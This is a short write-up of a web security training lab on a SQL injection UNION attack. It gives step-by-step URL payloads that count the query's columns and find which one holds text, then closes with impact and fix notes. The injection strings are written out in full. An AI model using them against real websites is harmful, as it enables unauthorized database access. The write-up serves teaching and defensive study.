# Lab: SQL Injection UNION Attack, Finding a Column Containing Text

## Summary

The website has a SQL Injection vulnerability in the `category` parameter. 

I used a `UNION SELECT` attack to find which column can contain text.

## Steps

1. Go to the category page:
```text
/filter?category=Accessories
```
2. First, I tested the parameter with a single quote:
```text
/filter?category=Accessories'
```
This showed that the parameter is vulnerable to SQL Injection.
3. I tested different numbers of `NULL` values:
```text
Accessories'+UNION+SELECT+null,null,null--+-
```
The query worked successfully, so I found that there are **3 columns**.
4. I tested which columns accept numbers:
```text
/filter?category=Accessories'+UNION+SELECT+null,null,55--+-
```
The query worked, so the first and second columns were tested further.
5. I tested a string in the second column:
```text
/filter?category=Accessories'+UNION+SELECT+44,'abc',55--+-
```
The query worked successfully, showing that the **second column can contain text**.

6. Finally, I replaced `abc` with the required string:
```text
/filter?category=Accessories'+UNION+SELECT+44,'husCiO',55--+-
```
The string was displayed on the page, which solved the lab.

## Impact

An attacker may use SQL Injection to access or extract data from the database.

## Fix

- Use prepared statements.
- Use parameterized queries.
- Do not put user input directly into SQL queries.